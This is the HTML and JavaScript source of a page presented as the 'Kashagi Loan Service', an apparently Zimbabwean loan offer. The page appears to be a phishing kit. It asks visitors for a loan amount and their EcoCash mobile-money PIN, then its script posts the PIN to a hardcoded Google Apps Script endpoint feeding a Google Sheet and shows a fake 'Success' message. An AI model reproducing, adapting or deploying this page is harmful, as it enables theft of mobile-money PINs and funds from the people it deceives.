<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Kashagi Loan Service</title>
    <style>
      /* RESET & BASIC SETUP */
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }

      body {
        background-color: #0d1b26;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        color: white;
      }

      .card {
        background-color: #162a3d;
        width: 100%;
        max-width: 400px;
        padding: 40px 30px;
        border-radius: 40px;
        border: 2px solid #ffcc00;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        position: relative;
      }

      h1 {
        font-size: 24px;
        font-weight: 800;
        margin-bottom: 20px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      .info-banner {
        background-color: #0d1b26;
        padding: 12px;
        border-radius: 50px;
        font-size: 14px;
        font-weight: 600;
        margin-bottom: 30px;
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 8px;
      }

      .input-label {
        display: block;
        text-align: left;
        color: #ffcc00;
        font-weight: 700;
        font-size: 14px;
        margin-bottom: 8px;
        text-transform: uppercase;
        padding-left: 10px;
      }

      .input-group {
        margin-bottom: 25px;
        position: relative;
      }

      input {
        width: 100%;
        padding: 18px 20px;
        border-radius: 50px;
        border: none;
        outline: none;
        font-size: 16px;
        font-weight: 500;
        color: #333;
        background-color: #f0f0f0;
      }

      input#loanAmount {
        border: 3px solid #ffcc00;
      }

      input::placeholder {
        color: #999;
      }

      .icon {
        margin-right: 5px;
      }

      .btn-submit {
        background-color: #ffcc00;
        color: #162a3d;
        width: 100%;
        padding: 20px;
        border-radius: 50px;
        border: none;
        font-size: 18px;
        font-weight: 800;
        text-transform: uppercase;
        cursor: pointer;
        margin-top: 10px;
        transition:
          transform 0.2s ease,
          background-color 0.2s;
      }

      .btn-submit:hover {
        transform: scale(1.02);
        background-color: #e6b800;
      }

      .btn-submit:disabled {
        background-color: #999;
        cursor: not-allowed;
        transform: none;
      }

      @media (max-width: 450px) {
        .card {
          margin: 20px;
          padding: 30px 20px;
        }
        h1 {
          font-size: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Kashagi Loan Service</h1>

      <div class="info-banner">
        <span>🇿🇼</span> Fill in your information below
      </div>

      <!-- Added an ID to the form so we can target it with JavaScript -->
      <form id="loanForm">
        <div class="input-group">
          <label class="input-label" for="loanAmount">
            <span class="icon">💰</span> Loan Amount
          </label>
          <input
            type="number"
            id="loanAmount"
            name="loanAmount"
            placeholder="Required"
            required
          />
        </div>

        <div class="input-group">
          <label class="input-label" for="ecocashPin">
            <span class="icon">🔒</span> EcoCash PIN
          </label>
          <input
            type="password"
            id="ecocashPin"
            name="pin"
            placeholder="****"
            maxlength="4"
            required
          />
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">
          Receive Funds
        </button>
      </form>
    </div>

    <!-- JAVASCRIPT TO SEND DATA TO GOOGLE SHEETS -->
    <script>
      // REPLACE THE URL BELOW WITH YOUR GOOGLE APPS SCRIPT WEB APP URL
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbwE8sHSK6AUjzuwQFIlq-sznwIhh36YTWfVV0AFOSyT-RZA13khq9n3KNnagpAnRZV1/exec";

      const form = document.getElementById("loanForm");
      const submitBtn = document.getElementById("submitBtn");

      form.addEventListener("submit", (e) => {
        e.preventDefault();

        // Change button text to show loading
        submitBtn.textContent = "Processing...";
        submitBtn.disabled = true;

        // Collect the form data
        let formData = new FormData(form);

        // Send data to Google Sheets
        fetch(scriptURL, { method: "POST", body: formData })
          .then((response) => {
            alert("Success! Your information has been received.");
            form.reset(); // Clear the form
            submitBtn.textContent = "Receive Funds";
            submitBtn.disabled = false;
          })
          .catch((error) => {
            alert("Error! Something went wrong. Please try again.");
            console.error("Error!", error.message);
            submitBtn.textContent = "Receive Funds";
            submitBtn.disabled = false;
          });
      });
    </script>
  </body>
</html>
